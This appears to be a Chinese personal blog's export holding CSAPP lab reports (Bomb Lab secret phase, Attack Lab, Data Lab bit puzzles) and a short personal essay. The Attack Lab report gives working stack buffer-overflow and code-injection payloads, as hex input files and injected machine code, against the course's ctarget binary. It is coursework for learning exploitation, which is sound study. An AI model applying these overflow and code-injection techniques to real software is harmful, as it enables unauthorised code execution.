&lt;n43&gt;:  0x0000000000000014      0x0000000000000000</span><br><span class="line">0x603280 &lt;n43+16&gt;:       0x0000000000000000       0x0000000000000000</span><br><span class="line">0x603290 &lt;n46&gt;:  0x000000000000002f      0x0000000000000000</span><br><span class="line">0x6032a0 &lt;n46+16&gt;:       0x0000000000000000       0x0000000000000000</span><br><span class="line">0x6032b0 &lt;n48&gt;:  0x00000000000003e9      0x0000000000000000</span><br><span class="line">0x6032c0 &lt;n48+16&gt;:       0x0000000000000000       0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>结合 8.2.4 节译出的函数 <code>fun7</code> 代码，可以发现这是一个二叉树。二叉树中每个结点是一个结构体，结点所在的地址指向的是数据 <code>val</code>，加上 <code>0x8</code> 后指向的是指针 <code>left</code>，加上 <code>0x10</code> 后指向的是指针 <code>right</code>。</p>
<p>因此，<code>fun7</code> 函数中的 <code>*p_node</code> 即 <code>p_node-&gt;val</code>，<code>*(p_node + 1)</code> 即 <code>p_node-&gt;left</code>，<code>*(p_node + 2)</code> 即 <code>p_node-&gt;right</code>。</p>
<p>根据之前 gdb 的输出信息绘制二叉树（数据已转化为十进制）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">            36</span><br><span class="line">         ／        ＼</span><br><span class="line">      8               50</span><br><span class="line">   ／   ＼          ／   ＼</span><br><span class="line">  6      22       45      107</span><br><span class="line"> &#x2F; \    &#x2F;  \     &#x2F;  \    &#x2F;   \</span><br><span class="line">1   7  20  35   40  47  99  1001</span><br></pre></td></tr></table></figure>
<p>可以发现这其实是一个 BST（Binary Search Tree，二叉查找树），而函数 <code>fun7</code> 的作用为：</p>
<ol>
<li>如果当前结点为 <code>NULL</code>，则返回 <code>0xffffffff</code>（直接爆了）；</li>
<li>如果找到了 <code>target</code>，则返回 <code>0</code>；</li>
<li>如果当前结点的值大于 <code>target</code>，则继续搜索左子树，返回时将左子树的返回值 <code>* 2</code>；</li>
<li>如果当前结点的值小于 <code>target</code>，则继续搜索右子树，返回时将右子树的返回值 <code>* 2 + 1</code>。</li>
</ol>
<p>起始时从根结点 <code>36</code> 开始查找，现在问题转化为：求 <code>target</code> 为何值时，最终的返回值为 <code>2</code>。</p>
<p>由之前的分析，返回值为 <code>2</code> 的条件为：</p>
<ol>
<li>最终找到 <code>target</code> 的值（<code>return 0</code>），此后可以沿右路返回任意次（<code>return 0</code>）；</li>
<li>然后沿左路返回（<code>return 1</code>）；</li>
<li>最后沿右路返回（<code>return 2</code>）。</li>
</ol>
<p>满足条件的结点的值有 2 个：<code>22</code>, <code>20</code>，即为所求。</p>
<p>于是得到本关的 2 个解：<code>22</code>, <code>20</code>。</p>
<h5 id="826-测试"><a class="markdownIt-Anchor" href="#826-测试"></a> 8.2.6 测试</h5>
<p>这里以 <code>22</code> 为例，在 gdb 中输入 Secret phase 的密码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">22</span><br></pre></td></tr></table></figure>
<p>输出信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">12Wow! You&#39;ve defused the secret stage!</span><br><span class="line">Congratulations! You&#39;ve defused the bomb!</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>汇编</tag>
        <tag>CSAPP</tag>
      </tags>
  </entry>
  <entry>
    <title>Attack Lab实验报告</title>
    <url>/2020/04/02/Attack-Lab/</url>
    <content><![CDATA[<p><img src="/2020/04/02/Attack-Lab/csapp.jpg" alt></p>
<a id="more"></a>
<h1 id="csapp-attack-lab-解题报告"><a class="markdownIt-Anchor" href="#csapp-attack-lab-解题报告"></a> CSAPP Attack Lab 解题报告</h1>
<h2 id="level1"><a class="markdownIt-Anchor" href="#level1"></a> Level1:</h2>
<h3 id="目标执行touch1函数"><a class="markdownIt-Anchor" href="#目标执行touch1函数"></a> 目标：执行touch1函数：</h3>
<p>在本题的讲义中给出了<code>getbuf</code>、<code>test</code>和<code>touch1</code>三个函数的C语言描述：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">getbuf</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[BUFFER_SIZE];</span><br><span class="line">    Gets(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    val = getbuf();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No exploit. Getbuf returned 0x%x\n&quot;</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vlevel = <span class="number">1</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Touch1!: You called touch1()\n&quot;</span>);</span><br><span class="line">    validate(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>该题的意图是我们应当利用<code>getbuf</code>中的缓冲区溢出漏洞使得执行<code>getbuf</code>之后重定向至<code>touch1</code>即可。因此我们需要确定<code>BUFFER_SIZE</code>的大小以及<code>touch1</code>函数所在的地址。</p>
<h4 id="首先反编译ctarget"><a class="markdownIt-Anchor" href="#首先反编译ctarget"></a> 首先反编译ctarget</h4>
<p>在Linux上使用命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">objdump -d ctarget &gt; ctarget.asm </span><br></pre></td></tr></table></figure>
<p>将<code>ctarget</code>反汇编成<code>ctarget.asm</code></p>
<h4 id="在ctarget上搜索touch1函数以及getbuf函数可以使用编辑器代码搜索功能"><a class="markdownIt-Anchor" href="#在ctarget上搜索touch1函数以及getbuf函数可以使用编辑器代码搜索功能"></a> 在ctarget上搜索touch1函数以及getbuf函数（可以使用编辑器代码搜索功能）</h4>
<p>可以发现getbuf的汇编代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:  48 83 ec 28            sub    $0x28,%rsp</span><br><span class="line">  4017ac:  48 89 e7               mov    %rsp,%rdi</span><br><span class="line">  4017af:  e8 ac 03 00 00         callq  401b60 &lt;Gets&gt;</span><br><span class="line">  4017b4:  b8 01 00 00 00         mov    $0x1,%eax</span><br><span class="line">  4017b9:  48 83 c4 28            add    $0x28,%rsp</span><br><span class="line">  4017bd:  c3                     retq   </span><br><span class="line">  4017be:  90                     nop</span><br><span class="line">  4017bf:  90                     nop</span><br></pre></td></tr></table></figure>
<p>从这里我们可以观察到<code>getbuf</code>函数首先执行了将rsp寄存器减去0x28这个操作，即将栈顶指针向下移40个比特位，因此我们可以推断出<code>BUFFER_SIZE</code>的大小为40。</p>
<p>之后我们可以同样使用这种方法搜索touch1函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00000000004017c0 &lt;touch1&gt;:</span><br><span class="line">  4017c0:  48 83 ec 08            sub    $0x8,%rsp</span><br><span class="line">  4017c4:  c7 05 0e 3d 20 00 01   movl   $0x1,0x203d0e(%rip)        # 6054dc &lt;vlevel&gt;</span><br><span class="line">  4017cb:  00 00 00 </span><br><span class="line">  4017ce:  bf e5 31 40 00         mov    $0x4031e5,%edi</span><br><span class="line">  4017d3:  e8 e8 f4 ff ff         callq  400cc0 &lt;puts@plt&gt;</span><br><span class="line">  4017d8:  bf 01 00 00 00         mov    $0x1,%edi</span><br><span class="line">  4017dd:  e8 cb 05 00 00         callq  401dad &lt;validate&gt;</span><br><span class="line">  4017e2:  bf 00 00 00 00         mov    $0x0,%edi</span><br><span class="line">  4017e7:  e8 54 f6 ff ff         callq  400e40 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>
<p>在该段汇编代码中，我们同样可以看出touch1函数的地址为0x4017c0。</p>
<p>因此编写输入数据就简单了。</p>
<p>首先打开一个文件写入数据：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim touch1.txt</span><br></pre></td></tr></table></figure>
<p>编辑文件如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">c0 17 40 00</span><br></pre></td></tr></table></figure>
<p>前40位可以任意填充，在40位后即为缓存区溢出位，这里压入的是函数返回地址，因此将<code>touch1</code>函数的地址写入即可在<code>ret</code>之后返回至<code>touch1</code>函数并执行。</p>
<p>最终我们使用hex2raw工具执行代码：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat touch1.txt | ./hex2raw | ./ctarget -q</span><br></pre></td></tr></table></figure>
<p>最终运行结果如下：</p>
<p><img src="/2020/04/02/Attack-Lab/level1.png" alt></p>
<h2 id="level2"><a class="markdownIt-Anchor" href="#level2"></a> Level2:</h2>
<h3 id="目标执行函数touch2并传入cookie的值作为参数val"><a class="markdownIt-Anchor" href="#目标执行函数touch2并传入cookie的值作为参数val"></a> 目标：执行函数touch2,并传入cookie的值作为参数val</h3>
<p>同样，在本题中也给出了<code>touch2</code>的函数实现</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch2</span><span class="params">(<span class="keyword">unsigned</span> val)</span></span>&#123;</span><br><span class="line">    vlevel = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (val == cookie)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Touch2!: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">        validate(<span class="number">2</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">        fail(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过在反汇编中寻找<code>touch2</code>代码，我们发现<code>touch2</code>的汇编语言如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00000000004017ec &lt;touch2&gt;:</span><br><span class="line">  4017ec:  48 83 ec 08            sub    $0x8,%rsp</span><br><span class="line">  4017f0:  89 fa                  mov    %edi,%edx</span><br><span class="line">  4017f2:  c7 05 e0 3c 20 00 02   movl   $0x2,0x203ce0(%rip)        # 6054dc &lt;vlevel&gt;</span><br><span class="line">  4017f9:  00 00 00 </span><br><span class="line">  4017fc:  3b 3d e2 3c 20 00      cmp    0x203ce2(%rip),%edi        # 6054e4 &lt;cookie&gt;</span><br><span class="line">  401802:  75 20                  jne    401824 &lt;touch2+0x38&gt;</span><br><span class="line">  401804:  be 08 32 40 00         mov    $0x403208,%esi</span><br><span class="line">  401809:  bf 01 00 00 00         mov    $0x1,%edi</span><br><span class="line">  40180e:  b8 00 00 00 00         mov    $0x0,%eax</span><br><span class="line">  401813:  e8 d8 f5 ff ff         callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401818:  bf 02 00 00 00         mov    $0x2,%edi</span><br><span class="line">  40181d:  e8 8b 05 00 00         callq  401dad &lt;validate&gt;</span><br><span class="line">  401822:  eb 1e                  jmp    401842 &lt;touch2+0x56&gt;</span><br><span class="line">  401824:  be 30 32 40 00         mov    $0x403230,%esi</span><br><span class="line">  401829:  bf 01 00 00 00         mov    $0x1,%edi</span><br><span class="line">  40182e:  b8 00 00 00 00         mov    $0x0,%eax</span><br><span class="line">  401833:  e8 b8 f5 ff ff         callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401838:  bf 02 00 00 00         mov    $0x2,%edi</span><br><span class="line">  40183d:  e8 2d 06 00 00         callq  401e6f &lt;fail&gt;</span><br><span class="line">  401842:  bf 00 00 00 00         mov    $0x0,%edi</span><br><span class="line">  401847:  e8 f4 f5 ff ff         callq  400e40 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>
<p>同样，我们找到了<code>touch2</code>函数的地址为<code>0x4017</code>。</p>
<p>由于本题需要在<code>touch2</code>中传入<code>cookie</code>参数才能执行成功，因此我们需要在输入文件中注入代码，并且将函数返回地址修改为代码注入的地址以实现代码注入攻击，因此我们需要知道<code>getbuf</code>函数栈顶地址（因为在此处我们需要注入代码）。</p>
<p>使用GDB调试一下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gdb ctarget</span><br><span class="line"></span><br><span class="line">(gdb) set args -q</span><br><span class="line"></span><br><span class="line">(gdb) b getbuf</span><br><span class="line"></span><br><span class="line">(gdb) r </span><br><span class="line"></span><br><span class="line">(gdb) ni </span><br><span class="line"></span><br><span class="line">(gdb) p/x $rsp</span><br></pre></td></tr></table></figure>
<p>在命令行中我们调试ctarget程序并且在getbuf函数上打断点，在<code>getbuf</code>执行一步过后，即<code>sub $0x28 ,%rsp</code>之后我们查看<code>$rsp</code>寄存器的值，输出：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">1 = 0x5561dc78</span></span><br></pre></td></tr></table></figure>
<p>接下来我们使用vim编辑注入汇编代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov    $0x59b997fa,%rdi</span><br><span class="line">push   $0x4017ec</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>然后将汇编代码后编译后再进行反编译以获取机器代码：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -c touch2.s</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">objdump -d touch2.o</span><br></pre></td></tr></table></figure>
<p>然后可以获取<code>touch2</code>的机器级代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 </span><br><span class="line"></span><br><span class="line">68 ec 17 40 00</span><br><span class="line"></span><br><span class="line">c3</span><br></pre></td></tr></table></figure>
<p>基于以上的信息我们就可以编辑输入文件了！</p>
<p>输入文件如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 68</span><br><span class="line">ec 17 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>
<p>在栈顶进行代码注入，同时在溢出去返回栈顶地址。</p>
<p>使用<code>hex2raw</code>进行输入。</p>
<p>结果如下：</p>
<p><img src="/2020/04/02/Attack-Lab/level2.png" alt></p>
<h2 id="level3"><a class="markdownIt-Anchor" href="#level3"></a> level3:</h2>
<h3 id="目标执行函数touch3并传入cookie的值的字符串作为参数sval"><a class="markdownIt-Anchor" href="#目标执行函数touch3并传入cookie的值的字符串作为参数sval"></a> 目标：执行函数touch3，并传入cookie的值的字符串作为参数sval</h3>
<p>与level2类似，区别在于我们这次需要构造一个字符串，而不是直接传一个整数，需要注意字符串保存位置。</p>
<p>讲义给出了<code>hexmatch</code>和<code>touch3</code>的代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hexmatch</span><span class="params">(<span class="keyword">unsigned</span> val, <span class="keyword">char</span> *sval)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">    <span class="keyword">char</span> *s = cbuf + random() % <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">sprintf</span>(s, <span class="string">&quot;%.8x&quot;</span>, val);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch3</span><span class="params">(<span class="keyword">char</span> *sval)</span></span>&#123;</span><br><span class="line">    vlevel = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> (hexmatch(cookie, sval))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">        validate(<span class="number">3</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">        fail(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可见需要传入表示 <code>cookie</code> 的值的字符串作为参数 <code>sval</code>。同时函数 <code>hexmatch</code> 的设计使得直接获取用于检验的字符串较为困难，因此我们需要自行构造这个字符串。</p>
<p>因此我们需要查看touch3的地址：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00000000004018fa &lt;touch3&gt;:</span><br><span class="line">  4018fa:  53                     push   %rbx</span><br><span class="line">  4018fb:  48 89 fb               mov    %rdi,%rbx</span><br><span class="line">  4018fe:  c7 05 d4 3b 20 00 03   movl   $0x3,0x203bd4(%rip)        # 6054dc &lt;vlevel&gt;</span><br><span class="line">  401905:  00 00 00 </span><br><span class="line">  401908:  48 89 fe               mov    %rdi,%rsi</span><br><span class="line">  40190b:  8b 3d d3 3b 20 00      mov    0x203bd3(%rip),%edi        # 6054e4 &lt;cookie&gt;</span><br><span class="line">  401911:  e8 36 ff ff ff         callq  40184c &lt;hexmatch&gt;</span><br><span class="line">  401916:  85 c0                  test   %eax,%eax</span><br><span class="line">  401918:  74 23                  je     40193d &lt;touch3+0x43&gt;</span><br><span class="line">  40191a:  48 89 da               mov    %rbx,%rdx</span><br><span class="line">  40191d:  be 58 32 40 00         mov    $0x403258,%esi</span><br><span class="line">  401922:  bf 01 00 00 00         mov    $0x1,%edi</span><br><span class="line">  401927:  b8 00 00 00 00         mov    $0x0,%eax</span><br><span class="line">  40192c:  e8 bf f4 ff ff         callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401931:  bf 03 00 00 00         mov    $0x3,%edi</span><br><span class="line">  401936:  e8 72 04 00 00         callq  401dad &lt;validate&gt;</span><br><span class="line">  40193b:  eb 21                  jmp    40195e &lt;touch3+0x64&gt;</span><br><span class="line">  40193d:  48 89 da               mov    %rbx,%rdx</span><br><span class="line">  401940:  be 80 32 40 00         mov    $0x403280,%esi</span><br><span class="line">  401945:  bf 01 00 00 00         mov    $0x1,%edi</span><br><span class="line">  40194a:  b8 00 00 00 00         mov    $0x0,%eax</span><br><span class="line">  40194f:  e8 9c f4 ff ff         callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401954:  bf 03 00 00 00         mov    $0x3,%edi</span><br><span class="line">  401959:  e8 11 05 00 00         callq  401e6f &lt;fail&gt;</span><br><span class="line">  40195e:  bf 00 00 00 00         mov    $0x0,%edi</span><br><span class="line">  401963:  e8 d8 f4 ff ff         callq  400e40 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>
<p>touch3的汇编代码如上所示，了解到<code>touch3</code>的地址为<code>0x4018fa</code>，因此我们可以基于此地址构造注入代码。在写注入代码前我们还需要了解到<code>cookie</code>数值的字符串表示，以及该字符串在栈中存放位置。</p>
<p>其中cookie的字符串表示可以通过查询ASCII码表或者使用高级语言输出来获得。</p>
<p>关于字符串在栈中的存放位置，我们可以试想一下，如果将cookie字符串的编码放在返回地址下面的时候，当我们<code>return</code>至<code>touch3</code>所在函数时会进行数据的入栈，因此当从栈中地址取出字符串参数时，该字符串已经被破坏掉了，因此我们需要将cookie字符串放在return地址的上面，为了安全起见，我们将<code>cookie</code>的值设置为<code>%rsp+48</code>的位置。</p>
<p>接下来编辑汇编代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov $0x5561dca8,%rdi</span><br><span class="line">push $0x4018fa</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>其中<code>0x5561dca8</code>这个地址是将栈顶指针加上48得到的。</p>
<p>之后，同level2一样，我们对注入代码进行汇编、反汇编获取机器码，这里不再赘述。</p>
<p>获取到的机器码为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55</span><br><span class="line"></span><br><span class="line">68 fa 18 40 00</span><br><span class="line"></span><br><span class="line">c3</span><br></pre></td></tr></table></figure>
<p>在之后我们就可以编写输入文件了。</p>
<p>输入文件如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">48 c7 c7 a8</span><br><span class="line">dc 61 55 68</span><br><span class="line">fa 18 40 00</span><br><span class="line">c3 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">78 dc 61 55</span><br><span class="line">00 00 00 00</span><br><span class="line">35 39 62 39</span><br><span class="line">39 37 66 61</span><br></pre></td></tr></table></figure>
<p>然后继续使用<code>hex2raw</code>工具进行输入。</p>
<p>输入结果如下：</p>
<p><img src="/2020/04/02/Attack-Lab/level3.png" alt></p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>汇编</tag>
        <tag>CSAPP</tag>
      </tags>
  </entry>
  <entry>
    <title>伴随岁月流逝的“严谨”</title>
    <url>/2020/03/27/strict-of-child/</url>
    <content><![CDATA[<p>两周以前我看了《大赢家》这部电影，想写些东西，奈何太忙而被搁置了，现在我的感受已经只剩那么零零星星的一点了，但我依然想把它们记录下来。说实话，其实《大赢家》这部电影并不能算是好的电影，但是主人公的形象是十分特别的，因为他总能让我想起我年轻的时候（大概是我上小学的时候）。</p>
<a id="more"></a>
<p>那时的我简直和故事的主人公一模一样，倒不是说做事严谨，就是对每件事情都很认真对待。举几个我到现在还记忆清晰的例子来说明一下。当时我上小学三年级，老师在前面写板书，让我们安静看书，可是不一会儿全班的同学就开始交头接耳，然后就喧嚷起来。于是我就忍不了了，当时我把老师的话看做圣旨，觉得那些不听老师话的都是坏孩子。然后我大喊了一声“别吵了！”，我的嗓门很大，我喊完以后全班就没一个人说话了，因为他们惊呆了，没有人会想到我敢干出这种事。可是结果怎么样呢？我被老师教训了，我不是班长，不是纪律委员，却越俎代庖地干了他们该干的事，结果我被训了，我认为我的出发点是好的，但是因为我这一行为遭到了几乎所有人的“不理解”与“偏见”，所以之后我就再也不干这种事了。</p>
<p>还有一件事是，在一次语文默写课文的时候，我发现我旁边的两位同学正在“作弊”，于是我就又忍不了了，我就告诉她们我要去老师那里告发她们，她们很慌张，于是拿出“火腿肠”来贿赂我，但是我没有接受（其实我是回族，接受了也不能吃），但是我忘记了为什么我最终也没有告发她们，也许当时我已经发现这种对待事情特别“较真”的态度其实不管放到哪个圈子里都是行不通的，因为他们其实并不把这叫做“认真”，而是叫做“情商低”、“爱较真”。</p>
<p>于是我也沦落到现在这样了，我也经常“作弊”，并且不再把这些看做什么了不得的事，因为我身边的人都是这么做的。但其实我内心是真的厌恶某些人、某些事情，但我不会这么勇敢地表达出来了。因为我害怕被那些人情世故所撕碎，被那些圈子所排斥。其实我更多地发现，我们每个人外面都披着一层“皇帝的新衣”，我们有一肚子的实话想对一些人讲出来，但我们不会讲。</p>
<p>因为恐惧…</p>
]]></content>
      <categories>
        <category>电影</category>
      </categories>
      <tags>
        <tag>人生</tag>
      </tags>
  </entry>
  <entry>
    <title>Data Lab实验报告</title>
    <url>/2020/03/10/Data-Lab/</url>
    <content><![CDATA[<p><img src="/2020/03/10/Data-Lab/csapp.jpg" alt></p>
<a id="more"></a>
<h1 id="csapp-data-lab实验报告"><a class="markdownIt-Anchor" href="#csapp-data-lab实验报告"></a> CSAPP Data Lab实验报告</h1>
<h5 id="1isasciidightint-x"><a class="markdownIt-Anchor" href="#1isasciidightint-x"></a> 1.<code>isAsciiDight(int x)</code></h5>
<p><strong>实现代码：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int isAsciiDigit(int x) &#123;</span><br><span class="line">    return(!((x+~48+1)&gt;&gt;31))&amp;!!((x+~58+1)&gt;&gt;31);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>实现思想：</strong></p>
<p>题目要求当参数x大于等于48小于等于57的时候返回1，否则返回0。</p>
<p>于是我们将x减去48并将其右移31位保留其符号位，此时若x减去48大于等于0则符号位为0因此要将其进行取反；同样，将x减去58并将其右移31位，此时真好同上面那种情况相反，因此要对符号位取两次反，最后再取与运算获得结果。</p>
<h5 id="2-int-anyevenbitint-x"><a class="markdownIt-Anchor" href="#2-int-anyevenbitint-x"></a> 2. <code>int anyEvenBit(int x)</code></h5>
<p><strong>实现代码：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int anyEvenBit(int x) &#123;</span><br><span class="line">    int t&#x3D;0x55 | (0x55&lt;&lt;8);</span><br><span class="line">    int mask&#x3D;t | (t&lt;&lt;16);</span><br><span class="line">    return !!(x&amp;mask);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>实现思想：</strong></p>
<p>题目要求当参数x有任何偶数位设置为1时返回1，否则返回0。</p>
<p>因此我们构造一个掩码，令该掩码的偶数位全为1，奇数位全为0，再令输入的参数x和该掩码进行与运算，若x中有偶数位被设置为1的话则与之后必不为0，因此两次取反返回。</p>
<h5 id="3-int-copylsbint-x"><a class="markdownIt-Anchor" href="#3-int-copylsbint-x"></a> 3. <code>int copyLSB(int x)</code></h5>
<p><strong>实现代码：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int copyLSB(int x) &#123;</span><br><span class="line">    return ((x&lt;&lt;31)&gt;&gt;31);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>实现思想：</strong></p>
<p>本题要求设置所有位为参数x的最低位，所以先左移31位再右移31位进行符号位扩展。</p>
<h5 id="4-int-leastbitposint-x"><a class="markdownIt-Anchor" href="#4-int-leastbitposint-x"></a> 4. <code>int leastBitPos(int x)</code></h5>
<p><strong>实现代码：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int leastBitPos(int x) &#123;</span><br><span class="line">    return x&amp;(~x+1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>实现思想：</strong></p>
<p>本题要求返回参数x最低设置为1的数。</p>
<p>我们先将x按位取反，取反后的数与原数据正好每一位都相反，我们再将该数加1，则此数会向前进一位，此时当且仅当原数的最低取取1位和取反后数据该位都为1，因此进行与运算后得到结果。</p>
<h5 id="int-divpwr2int-x-int-n"><a class="markdownIt-Anchor" href="#int-divpwr2int-x-int-n"></a> <code>int divpwr2(int x, int n)</code></h5>
<p><strong>实现代码：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int divpwr2(int x, int n) &#123;</span><br><span class="line">    int sign &#x3D;(x&gt;&gt;31)&amp;1;</span><br><span class="line">    int bias &#x3D; (sign&lt;&lt;n)+~sign +1;</span><br><span class="line">    return (x+bias)&gt;&gt;n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>实现思路：</strong></p>
<p>实验要求返回所给参数x/2^n的结果。</p>
<p>首先判断所给参数x的标志位，将x右移31位再和1进行与运算，若是正数则为0，负数则为1。</p>
<p>然后就是设置正数和负数的取整问题。当x为正数的时候，右移后向下取整，和题目要求相同，但是当x为负数时，也是向下取整，但此时题目要求要向上取整，因此要给负数加上一个偏置值再进行右移操作。因此负数要加上2^n-1来保证取整。</p>
<h5 id="6int-bitcountint-x"><a class="markdownIt-Anchor" href="#6int-bitcountint-x"></a> 6.<code>int bitCount(int x)</code></h5>
<p><strong>实现代码：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int bitCount(int x) &#123;</span><br><span class="line">    int t &#x3D; 0x55 + (0x55&lt;&lt;8);</span><br><span class="line">    int mask &#x3D; t + (t&lt;&lt;16);</span><br><span class="line">    x &#x3D; (x&amp;mask) + ((x&gt;&gt;1)&amp;mask);</span><br><span class="line"></span><br><span class="line">    t &#x3D; 0x33 + (0x33&lt;&lt;8);</span><br><span class="line">    mask &#x3D; t + (t&lt;&lt;16);</span><br><span class="line">    x &#x3D; (x&amp;mask) + ((x&gt;&gt;2)&amp;mask);</span><br><span class="line"></span><br><span class="line">    t &#x3D; 0xf + (0xf&lt;&lt;8);</span><br><span class="line">    mask &#x3D; t + (t&lt;&lt;16);</span><br><span class="line">    x &#x3D; (x&amp;mask) + ((x&gt;&gt;4)&amp;mask);</span><br><span class="line"></span><br><span class="line">    mask &#x3D; 0xff + (0xff&lt;&lt;16);</span><br><span class="line">    x &#x3D; (x&amp;mask) + 